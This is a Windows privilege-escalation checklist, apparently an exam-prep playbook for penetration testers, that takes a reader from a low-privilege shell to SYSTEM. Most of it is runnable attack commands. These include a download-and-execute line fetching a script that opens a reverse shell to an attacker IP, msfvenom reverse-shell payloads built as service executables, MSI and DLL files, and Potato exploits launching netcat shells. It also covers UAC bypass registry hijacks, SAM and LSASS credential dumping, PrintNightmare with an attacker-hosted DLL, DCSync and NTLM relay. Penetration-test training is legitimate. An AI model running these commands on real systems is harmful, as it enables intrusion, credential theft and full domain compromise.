# Windows Privilege Escalation Checklist

A stepwise enumeration playbook from "I have a shell as a low-privilege user" to SYSTEM. Run through the phases in order. Most CRT-difficulty Windows privesc paths are found in Phase 1 or 2.

## Phase 0: Stabilise the Shell

Windows shells are harder to stabilise than Linux. Some options:

```powershell
# If you have a basic cmd shell, upgrade to PowerShell
powershell -nop -ep bypass

# ConPtyShell for a real PTY (best option if available)
# 1. On Kali: stty raw -echo; (stty size; cat) | nc -lvnp 4444
# 2. On victim:
IEX(IWR http://10.10.14.5/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.10.14.5 4444

# Otherwise rlwrap on the listener side helps with line editing
rlwrap nc -lvnp 4444
```

If you have credentials, use evil-winrm from the start (it's a much better shell):

```bash
evil-winrm -i 10.10.10.50 -u user -p 'Password!'
evil-winrm -i 10.10.10.50 -u admin -H 31d6cfe0d16ae931b73c59d7e0c089c0
```

## Phase 1: Initial Situational Awareness (60 seconds)

Run these immediately on every new Windows foothold.

```cmd
:: Identity and privileges
whoami /all
whoami /priv
whoami /groups

:: System version
systeminfo
hostname
ver

:: Network
ipconfig /all
arp -a
netstat -anob          :: -b shows owning process; needs admin

:: Domain context
echo %USERDOMAIN%
echo %LOGONSERVER%
net config workstation
nltest /dclist:%USERDNSDOMAIN%
```

PowerShell equivalents:

```powershell
whoami /all
[System.Security.Principal.WindowsIdentity]::GetCurrent()
$env:USERNAME
$env:USERDOMAIN
$env:LOGONSERVER

Get-CimInstance Win32_OperatingSystem | Select Caption, Version, BuildNumber
Get-LocalUser
Get-LocalGroupMember Administrators
```

**What to look for:**

- [ ] **Privileges in `whoami /priv`** - the killer ones:
  - `SeImpersonatePrivilege` -> Potato attacks (likely SYSTEM)
  - `SeAssignPrimaryTokenPrivilege` -> Token impersonation
  - `SeBackupPrivilege` -> Read any file, including SAM
  - `SeRestorePrivilege` -> Write any file
  - `SeTakeOwnershipPrivilege` -> Take ownership of any file
  - `SeLoadDriverPrivilege` -> Load malicious kernel driver
  - `SeDebugPrivilege` -> Debug any process (read LSASS, etc.)
  - `SeManageVolumePrivilege` -> Volume management (sometimes chainable)
  - `SeTcbPrivilege` -> Act as part of OS (rare; very powerful)
  
- [ ] **Group memberships** in `whoami /groups`:
  - `BUILTIN\Administrators` -> already admin (just need elevation)
  - `BUILTIN\Backup Operators` -> read SAM directly
  - `Server Operators` -> manage services on DC
  - `Account Operators` -> create/modify users
  - `DnsAdmins` -> can deploy malicious DLL via DNS service
  - `Hyper-V Administrators` -> manage VMs (privesc paths)
  - `Print Operators` -> drivers, often privesc paths

- [ ] **OS Version** in `systeminfo`:
  - Windows 7 / 2008 R2 -> many kernel exploits
  - Windows 10 / 2016 / 2019 / 2022 -> fewer kernel exploits, focus on misconfigurations
  - Note the patch level (KBs listed at the bottom of `systeminfo`)

- [ ] **Domain joined?** `USERDOMAIN` differs from hostname = domain-joined.

## Phase 2: The Big Five (the 80% paths)

### 2.1 SeImpersonatePrivilege - The Potato Family

If `whoami /priv` shows `SeImpersonatePrivilege` enabled (typical for IIS app pool, MSSQL service accounts, etc.), you have a near-guaranteed path to SYSTEM via the Potato family of exploits.

**Choose the right Potato by Windows version**:

| Windows version | Use |
|---|---|
| Windows 7 / Server 2008 R2 / Server 2012 / Server 2012 R2 | **HotPotato** or **JuicyPotato** (with version-appropriate CLSID) |
| Windows 10 (early builds) / Server 2016 | **JuicyPotato** |
| Windows 10 1809+ / Server 2019 | **PrintSpoofer** or **RoguePotato** |
| Windows 10 / Server 2019 with Print Spooler patched | **RoguePotato** |
| Windows Server 2022 / Windows 11 | **GodPotato** or **EfsPotato** |
| All "modern" Windows | **PetitPotam-style** (network coercion - more complex) |

**Standard exploitation patterns**:

```cmd
:: PrintSpoofer (works through 2019)
PrintSpoofer.exe -i -c cmd
PrintSpoofer.exe -c "net localgroup administrators jdoe /add"

:: GodPotato (works on Server 2012R2 - Server 2022)
GodPotato.exe -cmd "cmd /c whoami"
GodPotato.exe -cmd "cmd /c net localgroup administrators user /add"

:: JuicyPotato (older - needs DCOM CLSID for the Windows version)
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c "{4991d34b-80a1-4291-83b6-3328366b9097}"

:: RoguePotato (newer, works where Juicy fails)
RoguePotato.exe -r 10.10.14.5 -e "C:\Temp\nc.exe 10.10.14.5 4444 -e cmd"
```

CLSIDs for JuicyPotato by Windows version are catalogued at https://github.com/ohpe/juicy-potato/tree/master/CLSID

These tools are typically pre-compiled into your CRESTDrive uploads.

### 2.2 Service Misconfigurations

#### 2.2.1 Service binary writable

```powershell
# Find services with writable binaries
$services = Get-WmiObject Win32_Service
foreach ($svc in $services) {
    $path = $svc.PathName -replace '"','' -replace ' .*$',''
    if ($path -and (Test-Path $path)) {
        $acl = Get-Acl $path -ErrorAction SilentlyContinue
        if ($acl.Access | Where-Object { $_.IdentityReference -match 'Users|Everyone' -and $_.FileSystemRights -match 'Write|Modify|FullControl' }) {
            Write-Host "WRITABLE SERVICE BINARY: $($svc.Name) -> $path"
        }
    }
}
```

```cmd
:: Or simpler - icacls each service binary
sc query state= all
:: For each, check icacls
icacls "C:\Program Files\VulnerableApp\service.exe"
```

If a service binary is writable by your user (or by `Users` / `Everyone`), replace it:

```bash
# Generate replacement on Kali
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe-service -o service.exe
```

```cmd
:: Upload service.exe (covered in command reference)
:: Replace
copy /Y service.exe "C:\Program Files\VulnerableApp\service.exe"

:: Restart the service (if you can) or wait for boot
sc stop VulnerableApp
sc start VulnerableApp
```

#### 2.2.2 Service config writable (sc sdshow / sdset)

```cmd
:: Check service permissions
sc sdshow VulnerableApp

:: If you have write permissions, modify the binary path
sc config VulnerableApp binPath= "cmd.exe /c net localgroup administrators jdoe /add"
sc start VulnerableApp
```

#### 2.2.3 Unquoted service paths

When a service path contains spaces but isn't quoted, Windows tries each path variant:

```
ImagePath = C:\Program Files\Vulnerable App\service.exe
```

Windows tries:
1. `C:\Program.exe`
2. `C:\Program Files\Vulnerable.exe`
3. `C:\Program Files\Vulnerable App\service.exe`

If any earlier path is writable by your user, drop a payload there.

```cmd
:: Find unquoted paths
wmic service get name, displayname, pathname, startmode | findstr /i /v "C:\Windows\\" | findstr /i /v """
```

```powershell
Get-WmiObject -Class Win32_Service | Where-Object {
    $_.PathName -notmatch '^"' -and $_.PathName -match ' '
} | Select-Object Name, DisplayName, PathName, StartMode
```

#### 2.2.4 PowerUp helper

`PowerUp.ps1` (PowerSploit) automates all of the above:

```powershell
# Import and run all checks
. .\PowerUp.ps1
Invoke-AllChecks

# Specific checks:
Get-ServiceUnquoted              # unquoted paths
Get-ModifiableService            # service ACLs allow you to edit config
Get-ModifiableServiceFile        # writable service binary
Get-RegistryAlwaysInstallElevated
Find-PathDLLHijack
Get-RegistryAutoLogon
```

### 2.3 AlwaysInstallElevated

If both registry keys are set to 1, any MSI installs as SYSTEM:

```cmd
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

If both = 1:

```bash
# On Kali
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f msi -o evil.msi
```

```cmd
:: Upload to victim, run silently:
msiexec /quiet /qn /i evil.msi
```

### 2.4 Stored Credentials

#### 2.4.1 Credential Manager / cmdkey

```cmd
cmdkey /list
:: Output shows entries; if any look interesting:
runas /savecred /user:CORP\administrator cmd
```

`runas /savecred` uses the previously-stored cred without re-prompting.

#### 2.4.2 Unattended install files

```cmd
type C:\unattend.xml 2>nul
type C:\Windows\Panther\Unattend.xml 2>nul
type C:\Windows\Panther\Unattended.xml 2>nul
type C:\Windows\Panther\Setup.xml 2>nul
type C:\Windows\system32\sysprep\sysprep.xml 2>nul
type C:\Windows\system32\sysprep\sysprep.inf 2>nul
type C:\Windows\Panther\unattend\Unattend.xml 2>nul
```

These contain plaintext or base64-encoded local admin passwords from the imaging process.

```powershell
# PowerShell version
Get-ChildItem c:\unattend.xml,c:\Windows\Panther\Unattend.xml,c:\Windows\Panther\Unattended.xml,c:\Windows\System32\sysprep\sysprep.xml,c:\Windows\System32\sysprep\sysprep.inf -ErrorAction SilentlyContinue | Get-Content
```

#### 2.4.3 Group Policy Preferences (GPP)

If you're domain-joined and can read SYSVOL, hunt for the cpassword:

```cmd
:: From a domain-joined host
findstr /S /I cpassword \\%USERDNSDOMAIN%\sysvol\%USERDNSDOMAIN%\Policies\*.xml
```

Or remotely with NetExec:

```bash
nxc smb 10.10.10.10 -u user -p 'pass' -M gpp_password
nxc smb 10.10.10.10 -u user -p 'pass' -M gpp_autologin
```

The cpassword is encrypted with a known-public AES key; tools decrypt automatically.

#### 2.4.4 Saved RDP / SSH credentials

```cmd
:: RDP
reg query "HKCU\Software\Microsoft\Terminal Server Client\Default"
reg query "HKCU\Software\Microsoft\Terminal Server Client\Servers"

:: SSH (if OpenSSH client used)
type %USERPROFILE%\.ssh\config 2>nul
type %USERPROFILE%\.ssh\known_hosts 2>nul
dir %USERPROFILE%\.ssh\ /a 2>nul
```

#### 2.4.5 PuTTY saved sessions

```cmd
reg query HKCU\Software\SimonTatham\PuTTY\Sessions
:: For each session, check HostName, UserName, ProxyHost, etc.
```

PuTTY stores session passwords (if "Saved Session" was used) in `Password` registry value, plaintext.

#### 2.4.6 Browser saved passwords

For modern browsers, passwords are encrypted with DPAPI keyed to the user. From the user's session:

```powershell
# Chrome / Edge - SQLite database in %LOCALAPPDATA%
type "%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data"
:: Need to extract via SQLite; use SharpChrome or similar
```

Tools that automate this (upload to victim if user-context):
- **SharpChrome** (GhostPack)
- **mimikatz** has DPAPI commands
- **LaZagne** (the comprehensive Windows credential extractor)

#### 2.4.7 General password file hunt

```cmd
findstr /si password *.txt *.xml *.ini *.config *.bak 2>nul
findstr /si "password" *.bat *.ps1 *.vbs *.psm1 2>nul
findstr /si "passw" *.* 2>nul

:: PowerShell version
Get-ChildItem -Recurse -Include *.txt,*.xml,*.ini,*.config,*.bak -ErrorAction SilentlyContinue | Select-String -Pattern "password" -ErrorAction SilentlyContinue | Select-Object Path, Line
```

#### 2.4.8 Web.config and IIS

```cmd
:: IIS connection strings often contain DB creds
type C:\inetsrv\config\applicationHost.config
type C:\Windows\System32\inetsrv\config\applicationHost.config
type C:\inetpub\wwwroot\web.config

:: Many web.configs in subdirs
dir /s /b C:\inetpub\wwwroot\*.config
```

IIS application pool credentials can be extracted from `applicationHost.config` and decrypted with `appcmd.exe`:

```cmd
%systemroot%\system32\inetsrv\appcmd.exe list apppool /text:*
```

### 2.5 UAC Bypass (when you're admin but not elevated)

If your user is in `Administrators` but you're running with limited token (UAC), bypass UAC:

```powershell
# fodhelper bypass
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value ""
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "cmd.exe /c start cmd.exe"
Start-Process "C:\Windows\System32\fodhelper.exe"

# eventvwr bypass
New-Item -Path "HKCU:\Software\Classes\mscfile\shell\open\command" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\mscfile\shell\open\command" -Name "(default)" -Value "cmd.exe"
Start-Process "C:\Windows\System32\eventvwr.exe"

# computerdefaults bypass (similar to fodhelper)
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value ""
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "cmd.exe"
Start-Process "C:\Windows\System32\ComputerDefaults.exe"
```

`UACME` is the comprehensive UAC bypass collection if you need an exotic technique.

## Phase 3: Group Memberships and ACLs

### 3.1 Backup Operators

If you're in `Backup Operators`, you can read any file via the backup API, including SAM/SYSTEM:

```powershell
# Save SAM and SYSTEM hives
reg save HKLM\SAM C:\Temp\SAM
reg save HKLM\SYSTEM C:\Temp\SYSTEM
reg save HKLM\SECURITY C:\Temp\SECURITY

# Exfil to Kali, then:
impacket-secretsdump LOCAL -sam SAM -system SYSTEM -security SECURITY
```

### 3.2 DnsAdmins (on a DC)

If you're a member of `DnsAdmins` and the DNS service runs on a Domain Controller, you can deploy a malicious DLL that loads with SYSTEM:

```cmd
:: Set the DLL path
dnscmd <DC> /config /serverlevelplugindll \\10.10.14.5\share\evil.dll

:: Restart DNS
sc stop dns
sc start dns
:: Or via the management interface

:: SYSTEM shell when DNS service starts
```

### 3.3 Hyper-V Administrators

If you're in `Hyper-V Administrators`, you can attach to running VMs - including DCs.

### 3.4 Server Operators (on a DC)

Can manage services on the DC. Replace a service binary or modify a service to run a malicious payload.

### 3.5 Print Operators

Can manage printer drivers - some drivers run in privileged context.

### 3.6 Account Operators

Can create users and modify some groups (not Administrators or Domain Admins). Useful for adding a created user to other privileged groups, or chaining with ACL abuse.

### 3.7 ACL-Based Privesc (Domain)

If you have GenericAll, GenericWrite, WriteDacl, or WriteOwner on another principal:

```bash
# From Linux with impacket
impacket-dacledit -action write -rights DCSync -principal attacker -target-dn 'DC=corp,DC=local' corp.local/svc-alfresco:s3rvice -dc-ip 10.10.10.10

# Then DCSync
impacket-secretsdump -just-dc-ntlm corp.local/attacker:'pass'@10.10.10.10
```

```powershell
# From Windows with PowerView
Add-DomainObjectAcl -TargetIdentity 'DC=corp,DC=local' -PrincipalIdentity attacker -Rights DCSync
```

BloodHound's "Find Shortest Paths from Owned" reveals these chains automatically.

## Phase 4: DLL Hijacking

If a process loads a DLL by name (no path), Windows searches in a defined order. If a writable directory is in the search order before the legitimate DLL location, drop a malicious DLL.

### 4.1 Identify candidates

```powershell
# Process Monitor (Sysinternals) - filter:
# Operation = CreateFile
# Path ends with .dll
# Result is NAME NOT FOUND

# This shows DLLs the process searched for and didn't find
# Each NAME NOT FOUND is a candidate for hijacking
```

### 4.2 Common writable locations in DLL search path

The default search order:

1. Application directory (where the EXE lives)
2. System directory (`C:\Windows\System32`)
3. 16-bit system directory
4. Windows directory
5. Current directory
6. PATH directories

```cmd
:: Check %PATH% for writable directories
echo %PATH%
:: Then check each:
icacls "C:\Some\Path\In\Path"
```

If `Users` or `Everyone` has Write, that's a hijack candidate.

### 4.3 Building the malicious DLL

```bash
# Generate
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f dll -o evil.dll

# For maximum compatibility, write a DLL with a DllMain that runs the payload
```

Place `evil.dll` at the path where the search will find it, then trigger the target binary.

## Phase 5: Token Manipulation (when SeAssignPrimaryToken or SeImpersonate not available but other priv)

### 5.1 SeBackupPrivilege

```cmd
reg save HKLM\SAM C:\Temp\SAM
reg save HKLM\SYSTEM C:\Temp\SYSTEM
:: Then secretsdump as in Phase 3.1
```

### 5.2 SeRestorePrivilege

Combined with `SeBackupPrivilege` allows arbitrary file replacement.

### 5.3 SeTakeOwnershipPrivilege

```cmd
takeown /f C:\important\file
icacls C:\important\file /grant <user>:F
```

### 5.4 SeDebugPrivilege

Can attach to any process, including LSASS:

```cmd
:: Dump LSASS via various tools
procdump.exe -ma lsass.exe lsass.dmp

:: Or via Task Manager (right-click lsass.exe > Create dump file)
:: Then exfil and parse with mimikatz on Kali:
:: pypykatz lsa minidump lsass.dmp
```

### 5.5 SeLoadDriverPrivilege

Load a malicious / vulnerable kernel driver to run code as kernel.

## Phase 6: Patch Level / Kernel Exploits

Last resort - same caveats as Linux. Most modern Windows is reasonably patched.

### 6.1 Identify missing patches

```cmd
:: Quick check - kernel level via systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
systeminfo | findstr /N /C:"KB"           :: list installed KBs

:: Or via WMIC
wmic qfe list brief
```

### 6.2 Watson - automated identification

```cmd
:: Watson is .NET; needs a recent .NET runtime on victim
Watson.exe
```

It cross-references installed KBs against a database of public exploits and reports which are missing.

### 6.3 Common kernel CVEs to recognise

| CVE | Name | Affected | Notes |
|---|---|---|---|
| MS16-032 | (no-name) | Win 7-10, 2008-2012 | Local elevation via secondary logon service |
| MS16-135 | (no-name) | Win 7-10, 2008-2016 | win32k.sys |
| MS17-017 | (no-name) | Win 7, 2008 R2 | win32k.sys |
| CVE-2018-8120 | Win32k LPE | Win 7, 2008 R2 | win32k.sys NULL pointer deref |
| CVE-2019-0863 | Diagnostics Hub | Win 10 | Diagnostics service |
| CVE-2019-1322 | UMPS | Win 10 | Update Medic Service |
| CVE-2020-0796 | SMBGhost | Win 10 1903/1909 | SMBv3 LPE option |
| CVE-2020-1472 | ZeroLogon | Pre-Aug 2020 patch DCs | Netlogon - not local but devastating |
| CVE-2021-1675 / 34527 | PrintNightmare | All Windows | Print Spooler - LPE option |
| CVE-2021-36934 | HiveNightmare/SeriousSAM | Win 10/11 specific builds | World-readable shadow copies of SAM |
| CVE-2022-21882 | Win32k LPE | Win 10/11 | win32k.sys |
| CVE-2022-37969 | Common Log File LPE | Various | CLFS driver |

### 6.4 PrintNightmare exploitation

Particularly relevant since it works on virtually all Windows that hadn't applied the patch:

```bash
# CVE-2021-1675 / 2021-34527 (PrintNightmare)
git clone https://github.com/cube0x0/CVE-2021-1675
python3 CVE-2021-1675.py corp.local/user:pass@10.10.10.50 '\\10.10.14.5\share\addCube.dll'
```

The DLL must be a malicious print driver-style DLL hosted on an SMB share (impacket-smbserver works).

### 6.5 HiveNightmare / SeriousSAM (CVE-2021-36934)

If shadow copies of SAM, SYSTEM, SECURITY are world-readable (specific Windows 10/11 builds), any user can read the password hashes:

```cmd
:: Check if vulnerable
icacls C:\Windows\System32\config\SAM
:: If "BUILTIN\Users:(I)(RX)" appears, vulnerable

:: Find shadow copies
vssadmin list shadows

:: Read SAM via shadow copy
copy "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM" C:\Temp\SAM
```

## Phase 7: Auto-Enumeration Tools

### 7.1 WinPEAS (the gold standard)

```cmd
:: x64
winPEASx64.exe

:: x86
winPEASx86.exe

:: Specific sections (faster)
winPEASx64.exe systeminfo
winPEASx64.exe userinfo
winPEASx64.exe servicesinfo
winPEASx64.exe applicationsinfo
winPEASx64.exe networkinfo
winPEASx64.exe windowscreds
winPEASx64.exe processinfo
winPEASx64.exe filesinfo
```

Use `cmd /c winPEASx64.exe > out.txt 2>&1` to save output, then review.

Pay attention to red items (likely privesc) and yellow items (worth checking).

### 7.2 PowerUp (PowerSploit)

```powershell
. .\PowerUp.ps1
Invoke-AllChecks

# Specific:
Get-ServiceUnquoted
Get-ModifiableService
Get-ModifiableServiceFile
Get-RegistryAlwaysInstallElevated
Find-PathDLLHijack
Get-RegistryAutoLogon
Get-VulnAutoRun
Get-UnattendedInstallFile
Get-WebConfig
Get-ApplicationHost
Get-CachedGPPPassword
```

### 7.3 Seatbelt (.NET, GhostPack)

Fast, comprehensive enumeration tool.

```cmd
Seatbelt.exe -group=user
Seatbelt.exe -group=system
Seatbelt.exe -group=remote
Seatbelt.exe -group=all
Seatbelt.exe LSASettings ProcessTokens
```

### 7.4 SharpUp (.NET equivalent of PowerUp)

```cmd
SharpUp.exe
SharpUp.exe audit
```

### 7.5 PowerView (AD enumeration from Windows)

```powershell
. .\PowerView.ps1

# Standard queries
Get-NetUser
Get-NetGroup
Get-NetComputer
Get-NetLoggedon -ComputerName <host>
Get-NetSession -ComputerName <host>
Find-LocalAdminAccess

# ACL exploration
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs
Find-InterestingDomainAcl

# Trusts
Get-NetForestTrust
Get-NetDomainTrust
```

## Phase 8: Domain-Joined Specific Paths

### 8.1 Kerberoast (you've already done this in Phase 2 of AD methodology if you have any domain user)

```cmd
:: Use Rubeus from inside Windows
Rubeus.exe kerberoast /outfile:hashes.txt
:: Or specify users:
Rubeus.exe kerberoast /user:svc_sql /outfile:hashes.txt
```

### 8.2 Coerced authentication (PetitPotam, Coercer, etc.)

If you can coerce a privileged service to authenticate to your machine, capture the NTLM hash or relay it.

```bash
# From Kali
python3 PetitPotam.py 10.10.14.5 10.10.10.10
# Listener on 10.10.14.5 captures the DC's machine account NTLMv2
```

### 8.3 NTLM Relay (when you've coerced auth or have Responder running)

```bash
# Relay to a host without SMB signing required
nxc smb 10.10.10.0/24 --gen-relay-list targets.txt

# Set up relay
sudo impacket-ntlmrelayx -tf targets.txt -smb2support

# Then trigger coerced auth via PetitPotam, PrinterBug, etc.
```

### 8.4 Resource-Based Constrained Delegation (RBCD)

If you can write `msDS-AllowedToActOnBehalfOfOtherIdentity` on a computer object (BloodHound finds this), you can impersonate any user to that computer.

### 8.5 ADCS (Active Directory Certificate Services) abuse

Modern AD privesc often involves AD CS misconfigurations:

- ESC1: vulnerable certificate template (any user can request as any user)
- ESC2: similar
- ESC3: certificate request agent
- ESC4: writable template
- ESC5: vulnerable PKI object
- ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2
- ESC7: vulnerable CA configuration
- ESC8: NTLM relay to AD CS HTTP endpoints

```bash
# Certipy (Linux) - the go-to tool
certipy find -u user@corp.local -p 'pass' -dc-ip 10.10.10.10
certipy req -ca 'CA-Name' -template 'VulnTemplate' -upn 'administrator@corp.local' -u user@corp.local -p 'pass'
```

### 8.6 LAPS (when accessible)

If LAPS is in use, the local admin password is stored in `ms-Mcs-AdmPwd` attribute on the computer object. With read access:

```bash
nxc ldap 10.10.10.10 -u user -p 'pass' --module laps
```

## Methodology Summary

In order of likelihood and effort:

1. **`whoami /priv`** - check for SeImpersonate (= Potato to SYSTEM)
2. **`whoami /groups`** - check for Backup Operators, DnsAdmins, etc.
3. **AlwaysInstallElevated** registry check
4. **Service misconfigurations** - PowerUp `Invoke-AllChecks`
5. **Stored credentials** - cmdkey, unattend.xml, web.config, SYSVOL GPP
6. **WinPEAS** for everything else automated
7. **Kernel exploits** as last resort

The CRT exam is unlikely to require obscure Windows kernel exploits. Most Windows privesc paths on the exam are findable through `whoami /priv` plus PowerUp plus a check of stored credentials. If you've spent more than 20 minutes without progress, run WinPEAS and let it find what you missed.

## Quick Wins Cheat (the "first 5 minutes" plan)

```cmd
:: Run all of these immediately on every Windows foothold:
whoami /priv
whoami /groups
sc query state= all | findstr SERVICE_NAME
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 2>nul
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 2>nul
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" 2>nul | findstr /i "DefaultUserName DefaultPassword AutoAdminLogon"
cmdkey /list
type C:\unattend.xml 2>nul
type C:\Windows\Panther\Unattend.xml 2>nul
wmic service get name, displayname, pathname, startmode | findstr /i /v "C:\Windows\\" | findstr /i /v """
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
```

If any of those produces a result, you usually have a path to SYSTEM within minutes.
